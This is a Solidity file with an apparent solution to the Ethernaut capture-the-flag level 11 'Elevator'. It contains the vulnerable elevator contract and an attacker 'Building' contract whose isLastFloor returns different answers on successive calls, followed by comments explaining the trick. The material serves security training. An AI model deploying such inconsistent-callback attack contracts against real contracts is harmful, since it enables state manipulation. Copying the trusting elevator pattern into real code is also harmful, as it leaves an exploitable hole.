// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IEthernautElevenBuilding {
    function isLastFloor(uint) external returns (bool);
}

contract EthernautElevenElevator {
    bool public top;
    uint public floor;

    function goTo(uint _floor) public {
        IEthernautElevenBuilding building = IEthernautElevenBuilding(
            msg.sender
        );

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}

contract EthernautElevenBuilding is IEthernautElevenBuilding {
    EthernautElevenElevator private immutable elevator;
    uint private constant TOP_FLOOR = 101;

    constructor(address _address) {
        elevator = EthernautElevenElevator(_address);
    }

    function isLastFloor(uint floor) external returns (bool) {
        if (elevator.floor() == TOP_FLOOR) {
            return true;
        } else {
            return false;
        }
    }

    function goTo(uint _floor) external {
        elevator.goTo(_floor);
    }
}

// https://ethernaut.openzeppelin.com/level/0x4A151908Da311601D967a6fB9f8cFa5A3E88a251

// Solution
// The solution lies in the fact that we get to:
// 1. implement the isLastFloor() method for the building
// 2. the elevator has a goTo() method which calls isLastFloor() twice:
//    a. once to check if the floor is the top floor of the building
//    b. setting value of top
// See how the elevator sets the floor state variable between the above 2 events
// So all we need to do is implement the isLastFloor() view method such that
// it returns two different values depending on the value of floor in the elevator
// Return true if the floor state variable is equal to the top floor for our building
// (we just take that as 101 here) and false otherwise
